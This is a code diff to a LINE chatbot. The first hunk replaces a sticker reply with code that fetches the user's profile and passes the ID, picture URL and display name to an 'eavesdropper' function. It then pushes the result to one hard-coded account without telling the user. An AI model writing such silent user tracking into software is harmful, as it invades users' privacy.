@@ -176,12 +176,15 @@ module.exports = class LineBot {
           .then((richMenuId) => {
             eroPicture.linkUser(this.botConfig.channelAccessToken,"richmenu-0338d622b3ab7520414d1c7d7afafefe",postback.source.userId);
           });
-          const sticker = {
-            type: "sticker",
-            packageId: "2",
-            stickerId: "165"
-          };
-          return this.reply(postback.replyToken, [sticker]);
+          // change menu notify
+          //
+          this.getProfile(postback.source.userid)
+          .then((profiledata) => {
+            const data = JSON.parse(profiledata);
+            const messageText = "change Menu";
+            const liyomessage = eroFunction.eavesdropper(data.userId, data.pictureUrl, data.displayName, messageText)
+            this.replyPush('U506c7426ba192e705210a874b97b40ca',[liyomessage]);
+          })
         }// =============== Layer 1
         else if (postback.postback.data === `action=news`){
           const confirm = bnreply.cubeeNews();
@@ -687,8 +690,8 @@ module.exports = class LineBot {
     }else if( ((message.message.text.indexOf('台北') != -1) && (message.message.text.indexOf('捷運') != -1)) || (message.message.text.indexOf('北捷') != -1) ){
       const confirm = {
         "type": "image",
-        "originalContentUrl": "https://i.imgur.com/c5yvWPM.jpg",
-        "previewImageUrl": "https://i.imgur.com/c5yvWPM.jpg"
+        "originalContentUrl": "https://i.imgur.com/G8cIHm2.jpg",
+        "previewImageUrl": "https://i.imgur.com/G8cIHm2.jpg"
       }; // end confirm
       return Promise.resolve(confirm);
     }else if( ((message.message.text.indexOf('高雄') != -1) && (message.message.text.indexOf('捷運') != -1)) || (message.message.text.indexOf('高捷') != -1) ){
